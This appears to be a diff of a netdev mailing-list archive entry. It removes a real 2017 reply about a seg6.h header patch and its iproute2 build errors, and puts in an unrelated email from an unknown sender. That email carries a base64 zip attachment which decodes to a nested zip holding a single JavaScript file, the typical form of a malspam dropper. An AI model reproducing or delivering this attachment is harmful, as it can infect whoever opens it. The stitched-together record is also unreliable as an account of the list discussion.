@@ -1,122 +1,101 @@
-From: Daniel Borkmann <daniel@iogearbox.net>
-Subject: Re: [PATCH net] ipv6: sr: fix user space compilation error with old
- glibc
-Date: Mon, 15 May 2017 12:05:07 +0200
-Message-ID: <59197D53.8030104@iogearbox.net>
-References: <20170515091828.19349-1-david.lebrun@uclouvain.be>
+From: <anita.traylor@maryvillecollege.edu>
+Subject: 23208 netdev
+Date: Mon, 15 May 2017 10:05:39 -0000
+Message-ID: <149484273969.6152.15428339817328143613@udm.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=windows-1252; format=flowed
-Content-Transfer-Encoding: 8bit
-Cc: netdev@vger.kernel.org
-To: David Lebrun <david.lebrun@uclouvain.be>
+Content-Type: application/zip; name="58825288.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from www62.your-server.de ([213.133.104.62]:53309 "EHLO
-        www62.your-server.de" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1759124AbdEOKFK (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Mon, 15 May 2017 06:05:10 -0400
-In-Reply-To: <20170515091828.19349-1-david.lebrun@uclouvain.be>
+Received: from a150.sub184.net78.udm.net ([78.85.184.150]:42950 "HELO udm.net"
+        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S933006AbdEOKFn (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Mon, 15 May 2017 06:05:43 -0400
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-On 05/15/2017 11:18 AM, David Lebrun wrote:
-> When seg6.h is included in a user space program that also includes
-> netinet/in.h, it results in multiple definitions of structures such as
-> struct in6_addr. Recent glibc versions have a workaround that consists in
-> defining __USE_KERNEL_IPV6_DEFS to prevent duplicates. However, such a
-> program will fail to compile with older glibc versions.
->
-> This patch ensures that including seg6.h will work in any case.
->
-> Fixes: ea3ebc73b46fbdb049dafd47543bb22efaa09c8e ("uapi: fix linux/seg6.h and linux/seg6_iptunnel.h userspace compilation errors")
-> Reported-by: Daniel Borkmann <daniel@iogearbox.net>
-> Signed-off-by: David Lebrun <david.lebrun@uclouvain.be>
-> ---
->   include/uapi/linux/seg6.h | 9 +++++++++
->   1 file changed, 9 insertions(+)
->
-> diff --git a/include/uapi/linux/seg6.h b/include/uapi/linux/seg6.h
-> index 7278511..52b8f46 100644
-> --- a/include/uapi/linux/seg6.h
-> +++ b/include/uapi/linux/seg6.h
-> @@ -15,7 +15,16 @@
->   #define _UAPI_LINUX_SEG6_H
->
->   #include <linux/types.h>
-> +
-> +#ifdef __KERNEL__
->   #include <linux/in6.h>		/* For struct in6_addr. */
-> +#else
-> +#ifdef __USE_KERNEL_IPV6_DEFS
-> +#include <linux/in6.h>
-> +#else
-> +#include <netinet/in.h>
-> +#endif
-> +#endif
->
->   /*
->    * SRH
->
-
-When this gets pulled into iproute2's include/linux/seg6.h due to
-header rebase, we still have the same effect.
-
-__USE_KERNEL_IPV6_DEFS gets defined by ip/iproute_lwtunnel.c, and
-when we then include above header, we end up including linux/in6.h
-just like before, same compile error in iproute2.
-
-Or, is there still another fix for iproute2 coming after this has
-landed?
-
-Thanks,
-Daniel
-
-ip
-     CC       iproute_lwtunnel.o
-In file included from ../include/linux/seg6.h:23:0,
-                  from iproute_lwtunnel.c:26:
-../include/linux/in6.h:131:26: error: expected identifier before numeric constant
-  #define IPPROTO_HOPOPTS  0 /* IPv6 hop-by-hop options */
-                           ^
-In file included from /usr/include/resolv.h:57:0,
-                  from ../include/utils.h:6,
-                  from iproute_lwtunnel.c:32:
-/usr/include/netinet/in.h:196:8: error: redefinition of ‘struct in6_addr’
-  struct in6_addr
-         ^
-In file included from ../include/linux/seg6.h:23:0,
-                  from iproute_lwtunnel.c:26:
-../include/linux/in6.h:32:8: note: originally defined here
-  struct in6_addr {
-         ^
-In file included from /usr/include/resolv.h:57:0,
-                  from ../include/utils.h:6,
-                  from iproute_lwtunnel.c:32:
-/usr/include/netinet/in.h:237:8: error: redefinition of ‘struct sockaddr_in6’
-  struct sockaddr_in6
-         ^
-In file included from ../include/linux/seg6.h:23:0,
-                  from iproute_lwtunnel.c:26:
-../include/linux/in6.h:49:8: note: originally defined here
-  struct sockaddr_in6 {
-         ^
-In file included from /usr/include/resolv.h:57:0,
-                  from ../include/utils.h:6,
-                  from iproute_lwtunnel.c:32:
-/usr/include/netinet/in.h:273:8: error: redefinition of ‘struct ipv6_mreq’
-  struct ipv6_mreq
-         ^
-In file included from ../include/linux/seg6.h:23:0,
-                  from iproute_lwtunnel.c:26:
-../include/linux/in6.h:59:8: note: originally defined here
-  struct ipv6_mreq {
-         ^
-iproute_lwtunnel.c: In function ‘parse_encap_seg6’:
-iproute_lwtunnel.c:375:3: warning: passing argument 3 of ‘inet_get_addr’ from incompatible pointer type [enabled by default]
-    inet_get_addr(s, NULL, &srh->segments[i]);
-    ^
-In file included from iproute_lwtunnel.c:32:0:
-../include/utils.h:241:5: note: expected ‘struct in6_addr *’ but argument is of type ‘struct in6_addr *’
-  int inet_get_addr(const char *src, __u32 *dst, struct in6_addr *dst6);
-      ^
-make[1]: *** [iproute_lwtunnel.o] Error 1
-make: *** [all] Error 2
+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
+zdIBUEsFBgAAAAABAAEAWwAAACMSAAAAAA==
